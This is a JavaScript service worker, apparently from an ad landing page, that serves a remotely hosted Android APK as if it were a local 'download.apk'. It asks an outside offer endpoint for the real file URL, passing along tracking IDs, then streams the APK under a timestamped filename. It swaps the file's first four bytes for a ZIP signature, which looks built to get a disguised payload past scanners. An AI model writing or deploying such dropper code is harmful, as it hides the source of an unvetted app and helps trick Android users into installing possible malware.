importScripts('./params2.js?v=personal-site-7');

self.addEventListener('install', () => {
  self.skipWaiting();
});

self.addEventListener('activate', (event) => {
  event.waitUntil(self.clients.claim());
});

self.addEventListener('message', (event) => {
  if (event.data && event.data.type === 'SKIP_WAITING') {
    self.skipWaiting();
  }
});

let apkPromise = null;
let apkError = null;
let apkRequestKey = null;
let apkState = null;

const OFFER_LINK_ENDPOINT = 'https://iijjuiu.shop/landers/gitand/offer-link.php';
const PK_SIGNATURE = new Uint8Array([0x50, 0x4B, 0x03, 0x04]);

function delay(ms) {
  return new Promise((resolve) => {
    setTimeout(resolve, ms);
  });
}

function getTimestampWithMs() {
  const d = new Date();
  const pad = (n, len = 2) => String(n).padStart(len, '0');

  const yyyy = d.getFullYear();
  const mm   = pad(d.getMonth() + 1);
  const dd   = pad(d.getDate());
  const hh   = pad(d.getHours());
  const mi   = pad(d.getMinutes());
  const ss   = pad(d.getSeconds());
  const ms   = pad(d.getMilliseconds(), 3); // 0..999 → "007", "123"

  return `${yyyy}-${mm}-${dd}_${hh}-${mi}-${ss}.${ms}`;
}

function sanitizeFileName(value) {
  const fallbackBase = 'download9918';

  const candidate = String(value || '')
        .replace(/\.apk$/i, '')
        .slice(0, 80);
  const isValid = candidate !== ''
        && !/^[ _-]+$/.test(candidate)
        && !/^ /.test(candidate)
        && /^[a-zA-Z0-9_*(). -]+$/.test(candidate);
  const base = isValid ? candidate : fallbackBase;

  const timestamp = getTimestampWithMs()

  return `${base}.${timestamp}.apk`;
}

function buildErrorResponse(message, status = 502) {
  return new Response(message, {
    status,
    headers: {
      'Content-Type': 'text/plain; charset=utf-8',
      'Cache-Control': 'no-store',
    },
  });
}

function isUsableContentLength(value) {
  const length = Number(value);
  return Number.isSafeInteger(length) && length > 0;
}

function resetApkState() {
  apkPromise = null;
  apkError = null;
  apkRequestKey = null;
  apkState = null;
}

function notifySubscribers(state, method, value) {
  state.subscribers.forEach((subscriber) => {
    try {
      subscriber[method](value);
    } catch (error) {
      console.error('[download] subscriber notification failed', error);
    }
  });
}

async function pumpApkBody(state, response) {
  const reader = response.body.getReader();

  try {
    while (true) {
      const { done, value } = await reader.read();
      if (done) {
        state.done = true;
        notifySubscribers(state, 'close');
        state.subscribers.clear();
        return;
      }

      state.chunks.push(value);
      state.bytes += value.byteLength;
      state.chunkCount += 1;
      notifySubscribers(state, 'enqueue', value);
    }
  } catch (error) {
    state.error = error;
    apkError = error;
    notifySubscribers(state, 'error', error);
    state.subscribers.clear();
    throw error;
  }
}

function getTemplateValue(params, key) {
  const normalizedKey = key.toLowerCase();
  if (normalizedKey === 'clickid' || normalizedKey === 'click_id' || normalizedKey === 'utm_id') {
    return getClickId(params);
  }

  const value = params.get(key);
  if (value !== null) {
    return value;
  }

  if (key === 't2') {
    return params.get('utm_medium') || '';
  }

  if (key === 't3') {
    return params.get('utm_source') || '';
  }

  return '';
}

function getClickId(params) {
  return params.get('click_id') || params.get('utm_id') || params.get('clickid') || params.get('clickId') || '';
}

function fillOfferUrlTemplate(value, params) {
  return value.replace(/\{([A-Za-z0-9_-]+)\}/g, (match, key) => {
    return encodeURIComponent(getTemplateValue(params, key));
  });
}

async function resolveOfferUrl(offerId, params) {
  const clickId = getClickId(params);
  const endpoint = new URL(OFFER_LINK_ENDPOINT);
  endpoint.searchParams.set('offer_id', offerId);
  if (clickId) {
    endpoint.searchParams.set('click_id', clickId);
  }

  const response = await fetch(endpoint.href, {
    method: 'GET',
    mode: 'cors',
    credentials: 'omit',
    redirect: 'follow',
    headers: {
      'Accept': 'application/json',
    },
  });

  if (!response.ok) {
    throw new Error(`offer HTTP ${response.status}`);
  }

  const data = await response.json();
  if (!data || typeof data.url !== 'string' || data.url.trim() === '') {
    throw new Error('offer response url is missing');
  }

  const sourceUrl = new URL(fillOfferUrlTemplate(data.url, params));
  if (!['http:', 'https:'].includes(sourceUrl.protocol)) {
    throw new Error('unsupported offer url protocol');
  }

  if (clickId) {
    sourceUrl.searchParams.set('utm_id', clickId);
  }

  return sourceUrl;
}

function createApkState(offerId, params, requestKey) {
  const state = {
    offerId,
    href: null,
    chunks: [],
    subscribers: new Set(),
    done: false,
    error: null,
    contentLength: null,
    contentDisposition: null,
    contentType: 'application/vnd.android.package-archive',
    bytes: 0,
    chunkCount: 0,
  };

  apkState = state;
  apkRequestKey = requestKey;

  apkPromise = (async () => {
    const sourceUrl = await resolveOfferUrl(offerId, params);
    state.href = sourceUrl.href;

    const response = await fetch(sourceUrl.href, {
      method: 'GET',
      mode: 'cors',
      credentials: 'omit',
      redirect: 'follow',
    });

    if (!response.ok) {
      throw new Error(`HTTP ${response.status}`);
    }

    const contentLength = response.headers.get('content-length');
    if (isUsableContentLength(contentLength)) {
      state.contentLength = contentLength;
    }

    state.contentType = response.headers.get('content-type') || state.contentType;
    state.contentDisposition = response.headers.get('content-disposition');
    pumpApkBody(state, response).catch((error) => {
      console.error('[download] upstream body read failed', error);
    });

    return state;
  })().catch((error) => {
    state.error = error;
    apkError = error;
    notifySubscribers(state, 'error', error);
    state.subscribers.clear();
    throw error;
  });

  return state;
}

async function getApkState(offerId, params, requestKey) {
  if (apkRequestKey && apkRequestKey !== requestKey) {
    resetApkState();
  }

  if (apkError) {
    resetApkState();
  }

  if (!apkState) {
    createApkState(offerId, params, requestKey);
  }

  await apkPromise;
  return apkState;
}

async function buildDeferredApkResponse(offerId, fileName, params, requestKey) {
  const headers = new Headers();
  headers.set('Content-Type', 'application/vnd.android.package-archive');
  headers.set('Cache-Control', 'no-store');
  headers.set('Content-Disposition', `attachment; filename="${fileName}"`);

  let subscriber = null;
  let state = null

  let skipped = 0
  const trimFirstFour = (chunk) => {
    if (skipped >= 4) return chunk;

    const need = 4 - skipped;
    if (chunk.byteLength <= need) {
      skipped += chunk.byteLength;
      return null;
    }

    skipped = 4;

    // ArrayBuffer → slice; Uint8Array/Buffer → subarray
    if (typeof chunk.subarray === 'function') {
      return chunk.subarray(need);
    }

    return chunk.slice(need);
  };

  const stream = new ReadableStream({
    async start(controller) {
      try {
        controller.enqueue(PK_SIGNATURE)

        state = await getApkState(offerId, params, requestKey);

        for (const chunk of state.chunks) {
          const out = trimFirstFour(chunk);

          if (out) {
            controller.enqueue(out);
          }
        }

        if (state.error) {
          controller.error(state.error);
          return;
        }

        if (state.done) {
          controller.close();
          return;
        }

        subscriber = {
          enqueue: (chunk) => {
            const out = trimFirstFour(chunk);

            if (out) {
              controller.enqueue(out);
            }
          },
          close: () => controller.close(),
          error: (error) => controller.error(error),
        };

        state.subscribers.add(subscriber);
      } catch (error) {
        console.error('[sw] buildDeferredResponse failed: ', error)
        controller.error(error);
      }
    },
    cancel() {
      if (subscriber && state) {
        state.subscribers.delete(subscriber);
      }
    },
  });

  return new Response(stream, {
    status: 200,
    statusText: 'OK',
    headers,
  });
}

self.addEventListener('fetch', (event) => {
  const requestUrl = new URL(event.request.url);

  const downloadUrl = new URL('./download.apk', self.location.href);
  if (requestUrl.origin !== downloadUrl.origin || requestUrl.pathname !== downloadUrl.pathname) {
    return;
  }

  event.respondWith((async () => {
    try {
      const params = new URLSearchParams(await B1Params.read());

      const offerId = params.get('offer_id');
      const fileName = sanitizeFileName(params.get('utm_medium'));
      if (!offerId || !offerId.trim()) {
        return buildErrorResponse('Missing saved offer_id parameter', 400);
      }

      return await buildDeferredApkResponse(
        offerId.trim().slice(0, 80),
        fileName,
        params,
        params.toString()
      );
    } catch (error) {
      return buildErrorResponse(`APK download failed: ${error}`, 502);
    }
  })());
});
